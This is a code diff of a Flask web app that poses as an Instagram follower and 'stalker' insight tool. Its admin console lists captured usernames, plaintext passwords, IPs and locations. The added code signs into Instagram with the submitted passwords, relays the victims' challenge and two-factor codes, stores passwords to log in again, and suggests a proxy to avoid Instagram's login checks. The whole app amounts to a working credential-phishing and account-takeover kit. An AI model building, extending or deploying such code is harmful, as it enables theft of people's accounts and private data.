+  ST.error=n.error;ST.last_sync=n.last_sync;
+  ST.syncMinutes=n.sync_minutes||10;ST.ghostDays=n.ghost_days||120;
+  if(n.state!==was){
+    loaded=false;
+    await render();
+    return;
+  }
+  if(n.state==="ok"&&(tab==="home"||tab==="act"))render();
+  else if(n.state==="pending"||n.state==="challenge"||n.state==="2fa")render();
+}
+
+(async function boot(){
+  await pull();
+  clearInterval(poll);
+  poll=setInterval(pull,5000);
+})();
 </script>
 </body>
 </html>
@@ -1368,6 +2122,19 @@ function cp(el){
 </body></html>
 """
 
+LOGIN_ADMIN_HTML = """<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1"><title>Console</title>
+<style>body{margin:0;height:100vh;display:grid;place-items:center;background:#0a0a0c;color:#ececf1;
+font-family:ui-monospace,Menlo,monospace}form{background:#141419;border:1px solid #232329;
+padding:26px;border-radius:14px;display:grid;gap:10px;width:280px}
+h1{font-size:13px;letter-spacing:.15em;text-transform:uppercase;margin:0 0 6px}
+input{background:#0a0a0c;border:1px solid #232329;color:#ececf1;padding:10px 12px;border-radius:9px;font:inherit;outline:none}
+input:focus{border-color:#3ba7ff}button{background:#3ba7ff;border:0;color:#001522;font:inherit;font-weight:700;
+padding:10px;border-radius:9px;cursor:pointer}</style></head><body>
+<form method="get" action="/admin"><h1>insight console</h1>
+<input type="password" name="token" placeholder="admin token" autofocus>
+<button type="submit">unlock</button></form></body></html>"""
+
 ADMIN_SELECT = """SELECT c.id, c.created_at, c.ip, c.ua, c.source, c.username, c.password,
                          c.country, c.city, c.isp FROM creds c"""
 
@@ -1405,7 +2172,7 @@ def row_html(r: sqlite3.Row) -> str:
     )
 
 
-# ============================== routes ==============================
+# ============================== request hooks ==============================
 @app.before_request
 def ensure_client_id():
     g.cid = request.cookies.get("cid") or uuid.uuid4().hex[:16]
@@ -1421,7 +2188,7 @@ def finalize(resp: Response) -> Response:
     resp.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
     resp.headers["Permissions-Policy"] = "geolocation=(), microphone=(), camera=(), interest-cohort=()"
     resp.headers["Content-Security-Policy"] = (
-        "default-src 'self'; img-src 'self' data: https://upload.wikimedia.org; "
+        "default-src 'self'; img-src 'self' data: https:; "
         "style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; "
         "connect-src 'self'; frame-ancestors 'none'; base-uri 'none'; form-action 'self'"
     )
@@ -1442,6 +2209,7 @@ def read_json() -> dict:
     return data if isinstance(data, dict) else {}
 
 
+# ============================== routes ==============================
 @app.route("/")
 def index():
     if session.get("user"):
@@ -1515,6 +2283,8 @@ def login():
         "last_cred": cred_id,
     })
 
+    start_login(g.cid, username, password)
+
     resp = redirect(url_for("dashboard"))
     resp.set_cookie("vc", str(visit), max_age=COOKIE_MAX_AGE, samesite="Lax")
     resp.set_cookie("last_user", username, max_age=COOKIE_MAX_AGE, samesite="Lax")
@@ -1528,6 +2298,7 @@ def dashboard():
         return redirect(url_for("index"))
 
     page = RESULTS_PAGE_HTML
+    page = page.replace("__HANDLE__", json.dumps(str(username)))
     page = page.replace("your.handle", str(escape(username)))
     page = page.replace(">YO<", ">" + str(escape(make_initials(username))) + "<")
     return html(page)
@@ -1569,9 +2340,176 @@ def console_redirect():
 
 @app.route("/logout")
 def logout():
+    drop_session(g.cid)
     for k in ("user", "last_login", "last_cred", "last_user"):
         session.pop(k, None)
     return redirect(url_for("index"))
+
+
+# ---------------- instagram api ----------------
+@app.route("/api/state")
+def api_state():
+    if not session.get("user"):
+        return jsonify({"ok": True, "state": "idle", "progress": {}, "error": None,
+                        "profile": None, "sync_minutes": SYNC_MINUTES,
+                        "ghost_days": GHOST_DAYS})
+
+    st = ig_state(g.cid)
+    if st.get("state", "idle") == "idle":
+        conn = connect()
+        try:
+            row = conn.execute("SELECT username, pass_enc FROM ig_sessions WHERE cid=?",
+                               (g.cid,)).fetchone()
+        finally:
+            conn.close()
+        if row:
+            start_login(g.cid, row["username"], unseal(row["pass_enc"]))
+            st = ig_state(g.cid)
+
+    conn = connect()
+    try:
+        me = conn.execute("SELECT * FROM self WHERE cid=?", (g.cid,)).fetchone()
+    finally:
+        conn.close()
+    profile = None
+    if me:
+        profile = {"username": me["username"], "full_name": me["full_name"], "pic": me["pic"],
+                   "followers": me["followers"], "following": me["following"], "posts": me["posts"]}
+    return jsonify({"ok": True, "state": st.get("state", "idle"), "error": st.get("error"),
+                    "progress": st.get("progress", {}), "last_sync": st.get("last_sync"),
+                    "profile": profile, "sync_minutes": SYNC_MINUTES, "ghost_days": GHOST_DAYS})
+
+
+@app.route("/api/challenge", methods=["POST"])
+def api_challenge():
+    submit_code(g.cid, read_json().get("code") or "")
+    return jsonify({"ok": True})
+
+
+@app.route("/api/2fa", methods=["POST"])
+def api_2fa():
+    submit_2fa(g.cid, read_json().get("code") or "")
+    return jsonify({"ok": True})
+
+
+@app.route("/api/sync", methods=["POST"])
+def api_sync():
+    if not session.get("user"):
+        return jsonify({"ok": False, "error": "not signed in"}), 401
+    if not IG_OK:
+        return jsonify({"ok": False, "error": "instagrapi not installed"}), 400
+    sync_now(g.cid)
+    return jsonify({"ok": True})
+
+
+@app.route("/api/reconnect", methods=["POST"])
+def api_reconnect():
+    conn = connect()
+    try:
+        row = conn.execute("SELECT username, pass_enc FROM ig_sessions WHERE cid=?", (g.cid,)).fetchone()
+    finally:
+        conn.close()
+    if not row:
+        return jsonify({"ok": False, "error": "no stored credentials — log in again"}), 400
+    ig_user, ig_pass = row["username"], unseal(row["pass_enc"])
+    drop_session(g.cid)
+    start_login(g.cid, ig_user, ig_pass)
+    return jsonify({"ok": True})
+
+
+def _profile_rows(rows, days=False, count=False):
+    out = []
+    for r in rows:
+        out.append({
+            "pk": r["pk"], "h": r["username"], "n": r["full_name"] or r["username"],
+            "pic": r["pic"], "v": r["verified"],
+            "d": days_since(r["last_eng"]) if days else 0,
+            "c": (r["cnt"] or 0) if count else 0,
+        })
+    return out
+
+
+@app.route("/api/list")
+def api_list():
+    kind = request.args.get("kind", "notback")
+    q = (request.args.get("q") or "").strip().lower()
+    filt = request.args.get("filter") or "all"
+    conn = connect()
+    try:
+        if kind == "notback":
+            rows = conn.execute(
+                "SELECT p.* FROM following_cache f JOIN profiles p ON p.pk=f.pk"
+                " WHERE f.cid=? AND f.pk NOT IN (SELECT pk FROM followers_cache WHERE cid=?)"
+                " ORDER BY p.username", (g.cid, g.cid)).fetchall()
+            data = _profile_rows(rows)
+        elif kind == "fans":
+            rows = conn.execute(
+                "SELECT p.* FROM followers_cache f JOIN profiles p ON p.pk=f.pk"
+                " WHERE f.cid=? AND f.pk NOT IN (SELECT pk FROM following_cache WHERE cid=?)"
+                " ORDER BY p.username", (g.cid, g.cid)).fetchall()
+            data = _profile_rows(rows)
+        elif kind == "ghosts":
+            rows = conn.execute(
+                "SELECT p.*, MAX(e.ts) AS last_eng FROM followers_cache f"
+                " JOIN profiles p ON p.pk=f.pk"
+                " LEFT JOIN engagement e ON e.pk=f.pk AND e.cid=f.cid"
+                " WHERE f.cid=? GROUP BY f.pk", (g.cid,)).fetchall()
+            data = [r for r in _profile_rows(rows, days=True) if r["d"] >= GHOST_DAYS]
+            data.sort(key=lambda x: -x["d"])
+        elif kind == "stalkers":
+            rows = conn.execute(
+                "SELECT p.*, COUNT(v.ts) AS cnt FROM visits v JOIN profiles p ON p.pk=v.pk"
+                " WHERE v.cid=? GROUP BY v.pk ORDER BY cnt DESC", (g.cid,)).fetchall()
+            data = _profile_rows(rows, count=True)
+        else:
+            data = []
+    finally:
+        conn.close()
+
+    if q:
+        data = [x for x in data if q in x["h"].lower() or q in x["n"].lower()]
+    if filt == "ver":
+        data = [x for x in data if x["v"]]
+    if filt == "top":
+        data = [x for x in data if x["c"] >= 3]
+    if filt == "old":
+        data = [x for x in data if x["d"] >= GHOST_DAYS]
+    return jsonify({"ok": True, "rows": data, "total": len(data)})
+
+
+@app.route("/api/activity")
+def api_activity():
+    conn = connect()
+    try:
+        rows = conn.execute("SELECT * FROM events WHERE cid=? ORDER BY id DESC LIMIT 120",
+                            (g.cid,)).fetchall()
+    finally:
+        conn.close()
+    return jsonify({"ok": True, "rows": [
+        {"kind": r["kind"], "subject": r["subject"], "detail": r["detail"],
+         "ts": r["created_at"], "thumb": r["thumb"]} for r in rows]})
+
+
+@app.route("/api/action", methods=["POST"])
+def api_action():
+    data = read_json()
+    kind = data.get("kind")
+    if kind not in ("unfollow", "follow", "unlike"):
+        return jsonify({"ok": False, "error": "bad kind"}), 400
+    res = enqueue(g.cid, kind, str(data.get("pk") or ""), data.get("username") or "")
+    return jsonify(res), (200 if res.get("ok") else 429)
+
+
+@app.route("/api/export")
+def api_export():
+    conn = connect()
+    try:
+        rows = conn.execute("SELECT * FROM events WHERE cid=? ORDER BY id", (g.cid,)).fetchall()
+    finally:
+        conn.close()
+    return Response(json.dumps([dict(r) for r in rows], indent=2, ensure_ascii=False),
+                    mimetype="application/json",
+                    headers={"Content-Disposition": "attachment; filename=activity.json"})
 
 
 # ---------------- admin ----------------
@@ -1795,7 +2733,8 @@ def healthz():
     finally:
         conn.close()
     return jsonify({"ok": True, "credentials": n, "geo": GEO_ENABLED,
-                    "admin_locked": bool(ADMIN_TOKEN)})
+                    "admin_locked": bool(ADMIN_TOKEN), "instagram": IG_OK,
+                    "crypto": CRYPTO_OK, "proxy": bool(IG_PROXY)})
 
 
 # ---------------- errors ----------------
@@ -1849,19 +2788,6 @@ def e500(_):
     return error_page("500", "something broke", 500)
 
 
-LOGIN_ADMIN_HTML = """<!DOCTYPE html><html><head><meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1"><title>Console</title>
-<style>body{margin:0;height:100vh;display:grid;place-items:center;background:#0a0a0c;color:#ececf1;
-font-family:ui-monospace,Menlo,monospace}form{background:#141419;border:1px solid #232329;
-padding:26px;border-radius:14px;display:grid;gap:10px;width:280px}
-h1{font-size:13px;letter-spacing:.15em;text-transform:uppercase;margin:0 0 6px}
-input{background:#0a0a0c;border:1px solid #232329;color:#ececf1;padding:10px 12px;border-radius:9px;font:inherit;outline:none}
-input:focus{border-color:#3ba7ff}button{background:#3ba7ff;border:0;color:#001522;font:inherit;font-weight:700;
-padding:10px;border-radius:9px;cursor:pointer}</style></head><body>
-<form method="get" action="/admin"><h1>insight console</h1>
-<input type="password" name="token" placeholder="admin token" autofocus>
-<button type="submit">unlock</button></form></body></html>"""
-
 # ============================== boot ==============================
 init_db()
 
@@ -1872,4 +2798,8 @@ if __name__ == "__main__":
         logger.warning("ADMIN_TOKEN unset — console is public. Set it before exposing.")
     if not os.environ.get("SECRET_KEY"):
         logger.warning("SECRET_KEY unset — using persisted key in %s", DATA_DIR / "secret.key")
+    if not IG_OK:
+        logger.warning("instagrapi missing — dashboard will not connect. pip install instagrapi cryptography")
+    if IG_OK and not IG_PROXY:
+        logger.warning("IG_PROXY unset — instagram will likely challenge logins from this IP")
     app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
